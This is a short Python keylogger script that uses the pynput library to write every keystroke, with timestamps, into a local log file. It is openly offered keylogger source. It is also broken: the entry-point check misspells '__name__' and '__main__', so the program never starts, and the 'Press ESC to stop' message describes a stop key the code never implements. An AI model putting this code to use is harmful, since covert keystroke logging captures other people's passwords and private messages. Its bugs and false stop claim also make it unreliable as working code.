# keylogger
from pynput import keyboard
import logging
from datetime import datetime

# Set up logging configuration
log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def main():
    print("🔐 Keylogger is running... (Press ESC to stop)")

    # Start listening to keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Keep the listener running

if _name_ == "_main_":
    main()
